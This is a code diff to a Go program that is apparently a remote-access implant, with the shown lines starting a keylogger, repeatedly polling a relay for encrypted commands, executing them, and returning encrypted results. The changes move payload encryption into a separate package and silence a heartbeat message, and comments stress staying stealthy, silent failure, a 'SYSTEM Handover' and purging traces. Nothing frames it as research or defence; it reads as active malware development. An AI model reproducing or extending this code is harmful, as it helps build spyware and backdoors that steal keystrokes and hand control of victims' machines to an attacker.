@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"image/png"
 	"io"
+	crypto "mrg2026/Crypto"
 	"net"
 	"os"
 	"os/exec"
@@ -82,7 +83,7 @@ func main() {
 	go startKeylogger()
 
 	for {
-		fmt.Printf("[+] Heartbeat [%s]: Polling...\n", targetID)
+		// fmt.Printf("[+] Heartbeat [%s]: Polling...\n", targetID)
 		err := pollAndExecute(targetID)
 		if err != nil {
 			// Silent fail to stay stealthy
@@ -303,7 +304,7 @@ func pollAndExecute(targetID string) error {
 		return nil
 	}
 
-	rawCmd, err := decryptPayload(strings.TrimSpace(cmdEnc), sessionKey)
+	rawCmd, err := crypto.DecryptPayload(strings.TrimSpace(cmdEnc), sessionKey)
 	if err != nil {
 		return nil
 	}
@@ -477,7 +478,7 @@ func pollAndExecute(targetID string) error {
 
 			// 2. IMMEDIATE FEEDBACK
 			finalOutput = "[+] SHIFT: SYSTEM Handover initiated. Check Node Matrix."
-			encRes, _ := encryptPayload(finalOutput, sessionKey)
+			encRes, _ := crypto.EncryptPayload(finalOutput, sessionKey)
 			fmt.Fprintf(relayConn, "%s\n", encRes)
 
 			// 3. LINGER & PURGE
@@ -521,7 +522,7 @@ func pollAndExecute(targetID string) error {
 	}
 
 	// 7. ENCRYPTED RESPONSE
-	encRes, _ := encryptPayload(finalOutput, sessionKey)
+	encRes, _ := crypto.EncryptPayload(finalOutput, sessionKey)
 	fmt.Fprintf(relayConn, "%s\n", encRes)
 	return nil
 }
